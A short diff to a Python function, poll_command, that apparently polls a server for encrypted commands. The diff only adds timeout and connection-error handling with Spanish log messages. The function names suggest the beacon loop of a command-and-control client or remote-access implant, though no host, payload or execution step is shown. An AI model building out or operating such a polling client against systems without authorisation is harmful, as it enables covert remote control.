@@ -280,6 +280,12 @@ def poll_command():
             print(f"[!] Error decrypting command: {decrypt_error}")
             return None
         
+    except requests.exceptions.Timeout as e:
+        print(f"[!] Timeout en poll (15s excedidos): {e}")
+        return None
+    except requests.exceptions.ConnectionError as e:
+        print(f"[!] Error de conexión en poll: {e}")
+        return None
     except Exception as e:
         print(f"[!] Error en poll: {e}")
         return None
